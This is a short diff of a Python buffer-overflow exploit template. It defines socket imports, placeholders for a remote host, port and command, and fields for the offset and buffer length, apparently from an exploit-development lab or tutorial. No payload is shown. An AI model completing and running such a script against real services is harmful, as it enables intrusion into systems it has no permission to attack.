@@ -1,11 +1,12 @@
 #!/usr/bin/python
+
 import socket, struct
 
 RHOST = '<ip>'
 RPORT = <port>
 cmd = '<command>'
+buf_totlen = <buffer_length>
 offset_srp = ## Paste in Offset found in step 2
-buf_totlen = ## Paste in buffer total length
 
 """
 ######################################################
